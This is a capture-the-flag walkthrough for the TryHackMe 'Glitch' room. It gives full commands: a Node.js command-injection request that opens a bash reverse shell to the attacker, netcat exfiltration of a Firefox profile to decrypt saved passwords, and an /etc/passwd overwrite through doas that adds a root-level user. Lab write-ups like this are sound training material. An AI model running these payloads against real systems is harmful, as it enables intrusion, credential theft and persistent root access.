# GLITCH

**Room Link:** [https://tryhackme.com/room/glitch](https://tryhackme.com/room/glitch)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>







### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>



### TCP/80 - HTTP

Looking into api directory we find a items page

**Kali**

```
gobuster dir -u http://$VICTIM/api -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>



Change the request from GET to POST and it gives an interesting message

<figure><img src="../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>



Running the below shows it is vulnerable

<figure><img src="../../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>



## Initial Shell

**Kali**

```
nc -lvnp
```

**Burp**

```
POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/$KALI/1337+0>%261"') HTTP/1.1
Host: 10.10.22.153
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=value
Upgrade-Insecure-Requests: 1


```



<figure><img src="../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

## Lateral Movement

**Victim**

```
tar -cvf backup.tar.gz .firefox/
```

### Netcat

**Kali(receiving)**

```
nc -l -p 1234 > backup.tar.gz
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < backup.tar.gz
```



**Kali**

```
tar xvf backup.tar.gz 
git clone https://github.com/unode/firefox_decrypt.git
python3.9  firefox_decrypt/firefox_decrypt.py .firefox/
```

<figure><img src="../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
su v0id
Password: love_the_void
```

<figure><img src="../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
find / -perm -u=s -type f 2> /dev/null
```

<figure><img src="../../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
/usr/local/bin/doas -u root cat /root/root.txt
```

<figure><img src="../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation

I used doas to read the passwd file, make a backup called passwd.old just in case it broke and passwd.new and added a new user

**Victim**

```
/usr/local/bin/doas -u root cat /etc/passwd
vi /tmp/passwd.new
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

/usr/local/bin/doas -u root cp /tmp/passwd.new /etc/passwd
su new
Password: 123
```

<figure><img src="../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>







